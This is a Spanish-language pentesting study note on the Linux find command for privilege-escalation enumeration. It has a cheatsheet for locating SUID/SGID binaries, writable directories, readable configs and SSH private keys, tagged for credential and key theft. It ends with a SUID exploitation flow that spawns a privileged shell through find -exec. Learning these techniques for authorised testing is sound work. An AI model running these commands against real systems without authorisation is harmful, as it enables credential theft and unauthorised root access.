---
aliases:
tags:
  - estado/completo
  - tool/find
kind: Tool
linked:
  - "[[Linux PrivEsc - SUID y SGID]]"
---
# find

> [!info]
> Buscar archivos por nombre, permisos, tamaño, fecha, owner. Core en Linux PrivEsc enum (SUID bins, world-writable files, etc.).

***

## Cheatsheet

| Comando | Qué obtenés | Cuándo |
|---|---|---|
| `find / -perm -4000 -type f 2>/dev/null` | Todos los SUID binaries | [[Linux PrivEsc - SUID y SGID]] |
| `find / -perm -2000 -type f 2>/dev/null` | Todos los SGID | Idem |
| `find / -writable -type d 2>/dev/null` | Directorios world-writable | Drop point para exploits |
| `find / -name "*.conf" -readable 2>/dev/null` | Configs leíbles | Hunt credentials |
| `find /home -name ".ssh" -type d 2>/dev/null` | SSH dirs | Cred reuse, key theft |
| `find / -name "id_rsa" 2>/dev/null` | SSH private keys | Cred theft |
| `find / -mtime -1 -type f 2>/dev/null` | Modificados últimas 24h | Recent activity |
| `find / -size +100M 2>/dev/null` | Archivos > 100MB | Backups, dumps |
| `find / -user root -perm -u+s 2>/dev/null` | SUID owned by root | Idem SUID enum |
| `find / -name "*.bak" 2>/dev/null` | Backup files | Source / config leaks |
| `find / -path '*/proc' -prune -o -name '.git' -print 2>/dev/null` | `.git` dirs (excluyendo /proc) | Source disclosure |

***

## SUID exploitation flow

```bash
# 1. List SUID bins
find / -perm -4000 -type f 2>/dev/null

# 2. Check GTFOBins for each unusual one
# https://gtfobins.github.io/

# 3. Exploit via documented technique
# Ej: find with SUID
/usr/bin/find . -exec /bin/sh -p \; -quit
```

***

## Notas Relacionadas

- [[Linux PrivEsc - SUID y SGID]]
- [[Linux Privilege Escalation]]
- [[grep]]
